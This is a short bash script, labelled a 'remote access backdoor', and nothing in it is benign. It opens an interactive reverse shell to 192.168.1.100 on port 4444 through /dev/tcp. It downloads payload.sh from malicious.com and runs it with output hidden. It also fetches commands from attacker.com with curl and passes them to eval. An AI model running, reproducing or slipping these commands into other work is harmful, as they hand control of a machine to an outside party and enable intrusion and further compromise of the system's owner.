#!/bin/bash
# Remote access backdoor
/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
wget http://malicious.com/payload.sh
chmod +x payload.sh
./payload.sh > /dev/null 2>&1
eval "$(curl http://attacker.com/cmd)"
